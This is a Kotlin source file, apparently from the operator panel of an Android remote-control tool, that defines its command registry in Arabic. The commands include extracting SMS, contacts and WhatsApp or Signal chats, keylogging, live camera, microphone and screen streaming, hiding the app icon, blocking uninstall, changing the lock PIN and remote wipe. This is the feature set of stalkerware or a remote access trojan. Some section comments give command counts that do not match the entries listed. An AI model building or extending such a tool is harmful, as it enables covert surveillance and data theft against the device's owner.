package com.abuzahra.admin.data.model

/**
 * Command definitions EXACTLY matching the server's COMMAND_REGISTRY.
 * The server expects these exact registry keys (e.g., "sms", "screenshot", "location").
 * The server then maps them to actual device commands internally.
 *
 * DO NOT change the "key" values - they must match server/modules/commands.py exactly.
 */
object CommandDefinitions {

    enum class Category(val displayName: String, val serverKey: String) {
        DATA("البيانات", "data"),
        SOCIAL("التواصل الاجتماعي", "social"),
        CONTROL("التحكم", "control"),
        APPS("التطبيقات", "apps"),
        FILES("الملفات", "files"),
        SECURITY("الأمان", "security"),
        MONITOR("المراقبة", "monitor"),
        STREAMING("البث", "streaming")
    }

    data class CommandDef(
        val key: String,        // MUST match server COMMAND_REGISTRY key exactly
        val name: String,
        val description: String,
        val category: Category
    )

    private val allCommands: List<CommandDef> = listOf(

        // ═══════════════════════════════════════════════════════════
        // DATA — 20 commands (matches server "data" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("sms", "الرسائل", "استخراج جميع الرسائل النصية القصيرة", Category.DATA),
        CommandDef("calls", "سجل المكالمات", "استخراج سجل المكالمات الكامل", Category.DATA),
        CommandDef("contacts", "جهات الاتصال", "استخراج جميع جهات الاتصال من الجهاز", Category.DATA),
        CommandDef("location", "الموقع", "الحصول على الموقع الجغرافي الحالي", Category.DATA),
        CommandDef("notifications", "الإشعارات", "استخراج جميع الإشعارات الحالية", Category.DATA),
        CommandDef("apps", "التطبيقات", "استخراج قائمة التطبيقات", Category.DATA),
        CommandDef("info", "معلومات الجهاز", "استخراج المعلومات الكاملة للجهاز", Category.DATA),
        CommandDef("battery", "البطارية", "استخراج حالة البطارية ومستوى الشحن", Category.DATA),
        CommandDef("gallery", "المعرض", "استخراج الصور من المعرض", Category.DATA),
        CommandDef("clipboard", "الحافظة", "استخراج النص المنسوخ في الحافظة", Category.DATA),
        CommandDef("all_data", "جميع البيانات", "استخراج جميع البيانات دفعة واحدة", Category.DATA),
        CommandDef("wifi_info", "معلومات WiFi", "استخراج شبكات WiFi المحفوظة", Category.DATA),
        CommandDef("network_info", "معلومات الشبكة", "استخراج معلومات الشبكة الحالية", Category.DATA),
        CommandDef("sim_info", "معلومات SIM", "استخراج معلومات شريحة SIM", Category.DATA),
        CommandDef("storage_info", "التخزين", "استخراج معلومات التخزين", Category.DATA),
        CommandDef("installed_apps", "التطبيقات المثبتة", "استخراج قائمة التطبيقات المثبتة", Category.DATA),
        CommandDef("running_apps", "التطبيقات النشطة", "استخراج التطبيقات قيد التشغيل حالياً", Category.DATA),
        CommandDef("calendar", "التقويم", "استخراج أحداث التقويم والمواعيد", Category.DATA),
        CommandDef("browser_history", "سجل المتصفح", "استخراج سجل التصفح والمواقع المزارة", Category.DATA),
        CommandDef("app_usage", "وقت الشاشة", "استخراج وقت استخدام التطبيقات", Category.DATA),

        // ═══════════════════════════════════════════════════════════
        // SOCIAL — 11 commands (matches server "social" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("whatsapp", "واتساب", "استخراج محادثات ووسائط واتساب", Category.SOCIAL),
        CommandDef("telegram_app", "تيليجرام", "استخراج محادثات ووسائط تيليجرام", Category.SOCIAL),
        CommandDef("instagram", "انستغرام", "استخراج محادثات انستغرام دايركت", Category.SOCIAL),
        CommandDef("messenger", "ماسنجر", "استخراج محادثات فيسبوك ماسنجر", Category.SOCIAL),
        CommandDef("snapchat", "سناب شات", "استخراج رسائل سناب شات", Category.SOCIAL),
        CommandDef("tiktok", "تيك توك", "استخراج رسائل وتفاعلات تيك توك", Category.SOCIAL),
        CommandDef("twitter", "تويتر", "استخراج رسائل تويتر", Category.SOCIAL),
        CommandDef("viber", "فايبر", "استخراج محادثات ورسائل فايبر", Category.SOCIAL),
        CommandDef("signal", "سيجنال", "استخراج محادثات سيجنال المشفرة", Category.SOCIAL),
        CommandDef("facebook", "فيسبوك", "استخراج بيانات فيسبوك", Category.SOCIAL),
        CommandDef("youtube", "يوتيوب", "استخراج بيانات يوتيوب", Category.SOCIAL),

        // ═══════════════════════════════════════════════════════════
        // CONTROL — 28 commands (matches server "control" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("ping", "Ping", "إرسال طلب ping للجهاز", Category.CONTROL),
        CommandDef("vibrate", "اهتزاز", "تشغيل اهتزاز الجهاز", Category.CONTROL),
        CommandDef("ring", "رنين", "تشغيل رنين الجهاز بكامل الصوت", Category.CONTROL),
        CommandDef("screenshot", "لقطة شاشة", "التقاط لقطة شاشة للجهاز", Category.CONTROL),
        CommandDef("front_camera", "الكاميرا الأمامية", "التقاط صورة بالكاميرا الأمامية", Category.CONTROL),
        CommandDef("back_camera", "الكاميرا الخلفية", "التقاط صورة بالكاميرا الخلفية", Category.CONTROL),
        CommandDef("record_audio", "تسجيل صوت", "تسجيل صوت من ميكروفون الجهاز", Category.CONTROL),
        CommandDef("record_screen", "تسجيل الشاشة", "بدء تسجيل فيديو لشاشة الجهاز", Category.CONTROL),
        CommandDef("lock_phone", "قفل الجهاز", "قفل شاشة الجهاز", Category.CONTROL),
        CommandDef("unlock_phone", "فتح الجهاز", "فتح شاشة الجهاز", Category.CONTROL),
        CommandDef("reboot", "إعادة تشغيل", "إعادة تشغيل الجهاز", Category.CONTROL),
        CommandDef("shutdown", "إيقاف التشغيل", "إيقاف تشغيل الجهاز", Category.CONTROL),
        CommandDef("set_volume", "التحكم بالصوت", "تعيين مستوى الصوت", Category.CONTROL),
        CommandDef("set_brightness", "السطوع", "تعيين مستوى سطوع الشاشة", Category.CONTROL),
        CommandDef("set_ringtone", "نغمة الرنين", "تغيير نغمة رنين الجهاز", Category.CONTROL),
        CommandDef("enable_wifi", "تشغيل WiFi", "تشغيل شبكة WiFi", Category.CONTROL),
        CommandDef("disable_wifi", "إيقاف WiFi", "إيقاف شبكة WiFi", Category.CONTROL),
        CommandDef("enable_bluetooth", "تشغيل بلوتوث", "تشغيل البلوتوث", Category.CONTROL),
        CommandDef("disable_bluetooth", "إيقاف بلوتوث", "إيقاف البلوتوث", Category.CONTROL),
        CommandDef("enable_mobile_data", "تشغيل البيانات", "تشغيل البيانات الخلوية", Category.CONTROL),
        CommandDef("disable_mobile_data", "إيقاف البيانات", "إيقاف البيانات الخلوية", Category.CONTROL),
        CommandDef("enable_hotspot", "تشغيل الهوت سبوت", "تشغيل نقطة اتصال WiFi", Category.CONTROL),
        CommandDef("disable_hotspot", "إيقاف الهوت سبوت", "إيقاف نقطة اتصال WiFi", Category.CONTROL),
        CommandDef("airplane_on", "وضع الطيار", "تفعيل وضع الطيران", Category.CONTROL),
        CommandDef("airplane_off", "إلغاء الطيران", "إلغاء وضع الطيران", Category.CONTROL),
        CommandDef("torch_on", "تشغيل الفلاش", "تشغيل ضوء الكشاف", Category.CONTROL),
        CommandDef("torch_off", "إيقاف الفلاش", "إيقاف ضوء الكشاف", Category.CONTROL),
        CommandDef("play_sound", "تشغيل صوت", "تشغيل صوت على الجهاز", Category.CONTROL),
        CommandDef("speak_text", "نطق نص", "نطق نص على الجهاز", Category.CONTROL),
        CommandDef("show_notification", "إظهار إشعار", "عرض إشعار على شاشة الجهاز", Category.CONTROL),
        CommandDef("open_url", "فتح رابط", "فتح رابط في متصفح الجهاز", Category.CONTROL),
        CommandDef("send_sms", "إرسال رسالة نصية", "إرسال رسالة نصية من الجهاز", Category.CONTROL),
        CommandDef("make_call", "إجراء مكالمة", "إجراء مكالمة هاتفية من الجهاز", Category.CONTROL),

        // ═══════════════════════════════════════════════════════════
        // APPS — 8 commands (matches server "apps" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("open_app", "فتح تطبيق", "فتح تطبيق على الجهاز", Category.APPS),
        CommandDef("close_app", "إغلاق تطبيق", "إغلاق تطبيق", Category.APPS),
        CommandDef("install_app", "تثبيت تطبيق", "تثبيت تطبيق من رابط APK", Category.APPS),
        CommandDef("uninstall_app", "حذف تطبيق", "إلغاء تثبيت تطبيق", Category.APPS),
        CommandDef("block_app", "حظر تطبيق", "حظر تطبيق من التشغيل", Category.APPS),
        CommandDef("unblock_app", "إلغاء حظر", "إلغاء حظر تطبيق", Category.APPS),
        CommandDef("clear_app_data", "مسح بيانات", "مسح جميع بيانات تطبيق", Category.APPS),
        CommandDef("force_stop_app", "إيقاف قسري", "إيقاف تطبيق بشكل قسري", Category.APPS),

        // ═══════════════════════════════════════════════════════════
        // FILES — 12 commands (matches server "files" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("list_files", "عرض الملفات", "عرض الملفات والمجلدات في مسار معين", Category.FILES),
        CommandDef("list_downloads", "التنزيلات", "عرض ملفات التنزيلات", Category.FILES),
        CommandDef("list_dcim", "الكاميرا", "عرض ملفات الكاميرا", Category.FILES),
        CommandDef("list_music", "الموسيقى", "عرض ملفات الموسيقى", Category.FILES),
        CommandDef("list_videos", "الفيديوهات", "عرض ملفات الفيديو", Category.FILES),
        CommandDef("list_documents", "المستندات", "عرض المستندات", Category.FILES),
        CommandDef("list_whatsapp", "واتساب ملفات", "عرض ملفات واتساب", Category.FILES),
        CommandDef("list_telegram_files", "تيليجرام ملفات", "عرض ملفات تيليجرام", Category.FILES),
        CommandDef("recent_files", "أحدث الملفات", "عرض أحدث الملفات", Category.FILES),
        CommandDef("search_files", "بحث ملفات", "البحث عن ملفات على الجهاز", Category.FILES),
        CommandDef("get_file", "تحميل ملف", "تحميل ملف من الجهاز", Category.FILES),
        CommandDef("delete_file", "حذف ملف", "حذف ملف من الجهاز", Category.FILES),
        CommandDef("send_full_backup", "نسخ احتياطي كامل", "أخذ نسخة احتياطية كاملة", Category.FILES),

        // ═══════════════════════════════════════════════════════════
        // SECURITY — 11 commands (matches server "security" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("wipe_data", "مسح البيانات", "مسح جميع البيانات", Category.SECURITY),
        CommandDef("factory_reset", "إعادة تعيين المصنع", "إعادة تعيين المصنع", Category.SECURITY),
        CommandDef("show_app", "إظهار التطبيق", "إظهار أيقونة التطبيق", Category.SECURITY),
        CommandDef("hide_app", "إخفاء التطبيق", "إخفاء أيقونة التطبيق", Category.SECURITY),
        CommandDef("change_passcode", "تغيير رمز PIN", "تغيير رمز PIN لقفل الشاشة", Category.SECURITY),
        CommandDef("enable_biometric", "تشغيل البصمة", "تفعيل قفل البصمة", Category.SECURITY),
        CommandDef("disable_biometric", "إيقاف البصمة", "إيقاف قفل البصمة", Category.SECURITY),
        CommandDef("anti_uninstall_on", "حماية الحذف", "تفعيل حماية الحذف", Category.SECURITY),
        CommandDef("anti_uninstall_off", "إلغاء الحماية", "إلغاء حماية الحذف", Category.SECURITY),
        CommandDef("device_admin_status", "حالة المسؤول", "عرض حالة مسؤول الجهاز", Category.SECURITY),
        CommandDef("check_root", "فحص الروت", "التحقق مما إذا كان الجهاز مروتاً", Category.SECURITY),

        // ═══════════════════════════════════════════════════════════
        // MONITOR — 10 commands (matches server "monitor" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("keylogger_start", "بدء تسجيل المفاتيح", "بدء تسجيل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("keylogger_stop", "إيقاف تسجيل المفاتيح", "إيقاف تسجيل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("get_keylogger", "عرض السجل", "عرض بيانات تسجيل المفاتيح", Category.MONITOR),
        CommandDef("screen_record_start", "بدء تسجيل الشاشة", "بدء تسجيل فيديو للشاشة", Category.MONITOR),
        CommandDef("screen_record_stop", "إيقاف التسجيل", "إيقاف تسجيل الشاشة", Category.MONITOR),
        CommandDef("location_live", "تتبع مباشر", "بدء تتبع الموقع المستمر", Category.MONITOR),
        CommandDef("location_stop", "إيقاف التتبع", "إيقاف تتبع الموقع", Category.MONITOR),
        CommandDef("clipboard_monitor_start", "مراقبة الحافظة", "بدء مراقبة الحافظة", Category.MONITOR),
        CommandDef("clipboard_monitor_stop", "إيقاف مراقبة الحافظة", "إيقاف مراقبة الحافظة", Category.MONITOR),
        CommandDef("sms_monitor", "مراقبة الرسائل", "بدء مراقبة الرسائل الواردة", Category.MONITOR),
        CommandDef("call_monitor", "مراقبة المكالمات", "بدء مراقبة المكالمات", Category.MONITOR),

        // ═══════════════════════════════════════════════════════════
        // STREAMING — 9 commands (matches server "streaming" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("start_screen_stream", "بث الشاشة", "بدء بث مباشر من الشاشة", Category.STREAMING),
        CommandDef("stop_screen_stream", "إيقاف بث الشاشة", "إيقاف بث الشاشة", Category.STREAMING),
        CommandDef("start_camera_stream", "بث الكاميرا", "بدء بث مباشر من الكاميرا", Category.STREAMING),
        CommandDef("stop_camera_stream", "إيقاف بث الكاميرا", "إيقاف بث الكاميرا", Category.STREAMING),
        CommandDef("start_audio_stream", "بث الصوت", "بدء بث مباشر من الميكروفون", Category.STREAMING),
        CommandDef("stop_audio_stream", "إيقاف بث الصوت", "إيقاف بث الصوت", Category.STREAMING),
        CommandDef("switch_camera", "تبديل الكاميرا", "تبديل بين الكاميرا الأمامية والخلفية", Category.STREAMING),
        CommandDef("set_stream_quality", "جودة البث", "تعيين جودة البث المباشر", Category.STREAMING),
        CommandDef("stop_all_streams", "إيقاف كل البث", "إيقاف جميع البثوصات النشطة", Category.STREAMING),
    )

    /**
     * Map of category -> list of command definitions for quick lookup.
     */
    val commandsByCategory: Map<Category, List<CommandDef>> by lazy {
        Category.entries.associateWith { category ->
            allCommands.filter { it.category == category }
        }
    }

    /**
     * Find a command definition by its key.
     */
    fun findByKey(key: String): CommandDef? {
        return allCommands.find { it.key == key }
    }

    /**
     * Total number of commands.
     */
    val totalCommands: Int get() = allCommands.size
}